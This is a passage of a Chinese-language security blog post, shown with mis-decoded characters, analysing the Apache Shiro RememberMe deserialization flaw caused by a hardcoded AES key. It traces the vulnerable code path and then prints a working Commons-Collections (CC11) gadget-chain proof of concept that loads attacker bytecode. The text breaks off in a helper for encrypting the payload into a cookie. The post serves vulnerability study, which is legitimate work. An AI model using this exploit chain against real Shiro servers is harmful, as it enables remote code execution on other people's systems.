<h3 id="æ¼æ´è¯¦è§£">æ¼æ´è¯¦è§£<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´è¯¦è§£">#</a></h3>
<p>Shiro ä» 0.9 ç‰ˆæœ¬å¼€å§‹è®¾è®¡äº† RememberMe çš„åŠŸèƒ½ï¼Œç”¨æ¥æä¾›åœ¨åº”ç”¨ä¸­è®°ä½ç”¨æˆ·ç™»é™†çŠ¶æ€çš„åŠŸèƒ½ã€‚</p>
<h5 id="remembermemanager">RememberMeManager<a hidden class="anchor" aria-hidden="true" href="#remembermemanager">#</a></h5>
<p>é¦–å…ˆæ˜¯æ¥å£ <code>org.apache.shiro.mgt.RememberMeManager</code>ï¼Œè¿™ä¸ªæ¥å£æä¾›äº† 5 ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li><code>getRememberedPrincipals</code>ï¼šåœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æ‰¾åˆ°è®°ä½çš„ principalsï¼Œä¹Ÿå°±æ˜¯ RememberMe çš„åŠŸèƒ½ã€‚</li>
<li><code>forgetIdentity</code>ï¼šå¿˜è®°èº«ä»½æ ‡è¯†ã€‚</li>
<li><code>onSuccessfulLogin</code>ï¼šåœ¨ç™»é™†æ ¡éªŒæˆåŠŸåè°ƒç”¨ï¼Œç™»é™†æˆåŠŸæ—¶ï¼Œä¿å­˜å¯¹åº”çš„ principals ä¾›ç¨‹åºæœªæ¥è¿›è¡Œè®¿é—®ã€‚</li>
<li><code>onFailedLogin</code>ï¼šåœ¨ç™»é™†å¤±è´¥åè°ƒç”¨ï¼Œç™»é™†å¤±è´¥æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚</li>
<li><code>onLogout</code>: åœ¨ç”¨æˆ·é€€å‡ºæ—¶è°ƒç”¨ï¼Œå½“ä¸€ä¸ª Subject æ³¨é”€æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚</li>
</ul>
<h5 id="abstractremembermemanager">AbstractRememberMeManager<a hidden class="anchor" aria-hidden="true" href="#abstractremembermemanager">#</a></h5>
<p>åŒæ—¶ï¼ŒShiro è¿˜æä¾›äº†ä¸€ä¸ªå®ç°äº† <code>RememberMeManager</code> æ¥å£çš„æŠ½è±¡ç±» <code>AbstractRememberMeManager</code>ï¼Œæä¾›äº†ä¸€äº›å®ç°æŠ€æœ¯ç»†èŠ‚ã€‚å…ˆä»‹ç»å…¶ä¸­é‡è¦çš„å‡ ä¸ªæˆå‘˜å˜é‡ï¼š</p>
<ul>
<li><code>DEFAULT_CIPHER_KEY_BYTES</code>ï¼šä¸€ä¸ª Base64 çš„ç¡¬ç¼–ç çš„ AES Keyï¼Œä¹Ÿæ˜¯æœ¬æ¬¡æ¼æ´çš„å…³é”®ç‚¹ï¼Œè¿™ä¸ª key ä¼šè¢«åŒæ—¶è®¾ç½®ä¸ºåŠ è§£å¯† key æˆå‘˜å˜é‡ï¼šencryptionCipherKey/decryptionCipherKey ã€‚</li>
<li><code>serializer</code>ï¼šShiro æä¾›çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„ PrincipalCollection å¯¹è±¡ã€‚</li>
<li><code>cipherService</code>ï¼šç”¨æ¥å¯¹æ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯ <code>org.apache.shiro.crypto.AesCipherService</code> ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„å®ç°ï¼Œæ‰€ä»¥åŠ è§£å¯†çš„ key æ˜¯ä½¿ç”¨äº†åŒä¸€ä¸ªã€‚</li>
</ul>
<p>åœ¨å…¶åˆå§‹åŒ–æ—¶ï¼Œä¼šåˆ›å»º <code>DefaultSerializer</code> ä½œä¸ºåºåˆ—åŒ–å™¨ï¼Œ<code>AesCipherService</code> ä½œä¸ºåŠ è§£å¯†å®ç°ç±»ï¼Œ<code>DEFAULT_CIPHER_KEY_BYTES</code> ä½œä¸ºåŠ è§£å¯†çš„ keyã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319150328312.png" alt="image-20230319150328312"  />
</p>
<h5 id="cookieremembermemanager">CookieRememberMeManager<a hidden class="anchor" aria-hidden="true" href="#cookieremembermemanager">#</a></h5>
<p>åœ¨ shiro-web åŒ…ä¸­æä¾›äº†å…·ä½“çš„å®ç°ç±» CookieRememberMeManagerï¼Œå®ç°äº†åœ¨ HTTP æ— çŠ¶æ€åè®®ä¸­ä½¿ç”¨ cookie è®°å½•ç”¨æˆ·ä¿¡æ¯çš„ç›¸å…³èƒ½åŠ›ã€‚å…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ–¹æ³•æ˜¯ <code>getRememberedSerializedIdentity</code>ï¼Œå…·ä½“é€»è¾‘å¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319150530988.png" alt="image-20230319150530988"  />
</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯å®ç°äº†ï¼Œè¯»å–<code>Cookie</code>çš„å€¼ï¼Œç„¶åbase64è§£å¯†å¹¶è¿”å›å­—èŠ‚æ•°ç»„ã€‚</p>
<h3 id="æ¼æ´åˆ†æ">æ¼æ´åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´åˆ†æ">#</a></h3>
<p>åœ¨ Filter å¤„ç†æµç¨‹ä¸­ï¼Œæ— è®ºæ˜¯ ShiroFilter è¿˜æ˜¯ IniShiroFilterï¼Œ <code>doFilter</code> æ–¹æ³•éƒ½æ˜¯ç»§æ‰¿è‡³ AbstractShiroFilterï¼Œä¼šè°ƒç”¨ <code>AbstractShiroFilter#doFilterInternal</code> æ–¹æ³•ï¼Œä½¿ç”¨ä¿å­˜çš„ SecurityManager åˆ›å»º Subject å¯¹è±¡ã€‚å…·ä½“è°ƒç”¨æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319152109357.png" alt="image-20230319152109357"  />
</p>
<p>åˆ›å»º Subject å¯¹è±¡åï¼Œä¼šè¯•å›¾ä»åˆ©ç”¨å½“å‰çš„ä¸Šä¸‹æ–‡ä¸­çš„ä¿¡æ¯æ¥è§£æå½“å‰ç”¨æˆ·çš„èº«ä»½ï¼Œå°†ä¼šè°ƒç”¨ <code>DefaultSecurityManager#resolvePrincipals</code> æ–¹æ³•ï¼Œç»§ç»­è°ƒç”¨ <code>AbstractRememberMeManager#getRememberedPrincipals</code> æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319152241281.png" alt="image-20230319152241281"  />
</p>
<p>ç„¶åè°ƒç”¨<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>æ–¹æ³•æ¥å°†<code>Cookie</code>è¿›è¡Œbase64è§£å¯†ã€‚</p>
<p>ç„¶åè°ƒç”¨<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code>æ–¹æ³•ï¼Œé‡Œé¢å…³æ³¨<code>decrypt</code>æ–¹æ³•å’Œ<code>deserialize</code>æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154238333.png" alt="image-20230319154238333"  />
</p>
<p><code>decrypt</code>æ–¹æ³•æ˜¯AesCipherService è¿›è¡Œè§£å¯†ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154406804.png" alt="image-20230319154406804"  />
</p>
<p>åœ¨ Shiro ä¸­ï¼Œåºåˆ—åŒ–å™¨çš„é»˜è®¤å®ç°æ˜¯ DefaultSerializerï¼Œå¯ä»¥çœ‹åˆ°å…¶ <code>deserialize</code> æ–¹æ³•ä½¿ç”¨ Java åŸç”Ÿååºåˆ—åŒ–ï¼Œä½¿ç”¨ ByteArrayInputStream å°† byte è½¬ä¸º ObjectInputStream ï¼Œå¹¶è°ƒç”¨ <code>readObject</code> æ–¹æ³•æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154521905.png" alt="image-20230319154521905"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154539047.png" alt="image-20230319154539047"  />
</p>
<p>ä»¥ä¸Šå°±æ˜¯ Shiro åˆ›å»º Subject æ—¶æ‰§è¡Œçš„é€»è¾‘ï¼Œè·Ÿä¸‹æ¥åå°±çœ‹åˆ°äº†å®Œæ•´çš„æ¼æ´è§¦å‘é“¾ï¼š</p>
<p>æ”»å‡»è€…æ„é€ æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼Œä½¿ç”¨ç¡¬ç¼–ç çš„ AES åŠ å¯†ï¼Œç„¶å Base64 ç¼–ç æ”¾åœ¨ Cookie ä¸­ï¼Œå³å¯è§¦å‘æ¼æ´åˆ©ç”¨ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20210418211722559.png" alt="image-20210418211722559"  />
</p>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´åˆ©ç”¨">#</a></h3>
<p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ cc11 æ¥åŠ è½½æˆ‘ä»¬çš„æ¶æ„ä»£ç æ¥æ‰“è¿‡å»ï¼Œcc11 çš„å¥½å¤„åœ¨äºå¯ä»¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œä¾‹å¦‚ cc6 å’Œ cc11çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œä¸€ä¸ªæ˜¯ä»£ç æ‰§è¡Œï¼Œç›¸æ¯”ä¹‹ä¸‹è‚¯å®šæ˜¯æˆ‘ä»¬çš„ä»£ç æ‰§è¡Œå±å®³æ¯”è¾ƒå¤§</p>
<p>Shiro ä½¿ç”¨ <code>ClassResolvingObjectInputStream</code> æ‰§è¡Œååºåˆ—åŒ–çš„æ“ä½œï¼Œè¿™ä¸ªç±»é‡å†™äº† <code>resolveClass</code> ï¼Œå®é™…ä½¿ç”¨ <code>ClassLoader.loadClass()</code> æ–¹å¼è€Œé ObjectInputStream ä¸­çš„ <code>Class.forName()</code> çš„æ–¹å¼ã€‚è€Œ <code>forName</code> çš„æ–¹å¼å¯ä»¥åŠ è½½ä»»æ„çš„æ•°ç»„ç±»å‹ï¼Œ<code>loadClass</code> åªèƒ½åŠ è½½åŸç”Ÿçš„ç±»å‹çš„ Object Arrayã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319195206455.png" alt="image-20230319195206455"  />
</p>
<p>åœ¨ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒä¸­çš„ã€ŠJavaå®‰å…¨æ¼«è°ˆ - 15.TemplatesImplåœ¨Shiroä¸­çš„åˆ©ç”¨.pdfã€‹ åŠ ã€ŠShiro-1-2-4-RememberMeååºåˆ—åŒ–æ¼æ´åˆ†æ-CVE-2016-4437.pdfã€‹ä¸¤ç¯‡æ–‡ç« ä¸­é’ˆå¯¹æ­¤é—®é¢˜è¿›è¡Œäº†è®¨è®ºå’Œè°ƒè¯•ã€‚</p>
<p>cc11 çš„ Poc</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> CC11 {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> setFieldValue(Object obj, String fileNmae, Object value) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field = obj.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(fileNmae);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">set</span>(obj,value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// æ„é€ æ¶æ„ TemplatesImpl å¯¹è±¡
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        TemplatesImpl obj = <span style="color:#fff;font-weight:bold">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// è·å–æ¶æ„ç±»çš„å­—èŠ‚ç 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/JavaSec/Deserializer/target/classes/CC11/EvilClass.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[][] codes = {code};
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// åå°„ä¿®æ”¹å±æ€§
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_bytecodes&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> <span style="color:#fff;font-weight:bold">byte</span>[][] {code});
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;HelloTemplatesImpl&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_tfactory&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ================
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// åˆ©ç”¨ InvokerTransformer è°ƒç”¨ TemplatesImpl.newTransformer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer = <span style="color:#fff;font-weight:bold">new</span> InvokerTransformer(<span style="color:#0ff;font-weight:bold">&#34;newTransformer&#34;</span>, <span style="color:#fff;font-weight:bold">null</span>, <span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å‡çš„é“¾å­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Transformer fakeTransformer = <span style="color:#fff;font-weight:bold">new</span> ConstantTransformer(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//===============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map innerMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#007f7f">decorate</span>(innerMap, fakeTransformer);
</span></span><span style="display:flex;"><span>        TiedMapEntry tme = <span style="color:#fff;font-weight:bold">new</span> TiedMapEntry(outerMap, obj);
</span></span><span style="display:flex;"><span>        Map expMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        expMap.<span style="color:#007f7f">put</span>(tme, <span style="color:#0ff;font-weight:bold">&#34;valuevalue&#34;</span>);
</span></span><span style="display:flex;"><span>        innerMap.<span style="color:#007f7f">remove</span>(obj);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(outerMap, <span style="color:#0ff;font-weight:bold">&#34;factory&#34;</span>, invokerTransformer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ==============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oss = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;./cc11.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">writeObject</span>(expMap);
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ObjectInputStream ois = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(<span style="color:#fff;font-weight:bold">new</span> FileInputStream(<span style="color:#0ff;font-weight:bold">&#34;./cc11.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        Object o = (Object) ois.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œ cc11 çš„ poc ç”Ÿæˆå¯¹åº”æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨å¦‚ä¸‹ä»£ç è¿›è¡ŒåŠ å¯†ç”Ÿæˆ</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">byte</span>[] getBytes(String path) <span style="color:#fff;font-weight:bold">throws</span> Exception{
</span></span><span style="display:flex;"><span>        InputStream inputStream = <span style="color:#fff;font-weight:bold">new</span> FileInputStream(path);
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream = <span style="color:#fff;font-weight:bold">new</span> ByteArrayOutputStream();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">int</span> n = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">while</span> ((n=inputStream.<span style="color:#007f7f">read</span>())!=-<span style="color:#ff0;font-weight:bold">1</span>){
</span></span><span style="display:flex;"><span>            byteArrayOutputStream.<span style="color:#007f7f">write</span>(n);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[] bytes = byteArrayOutputStream.<span style="color:#007f7f">toByteArray</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> bytes;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
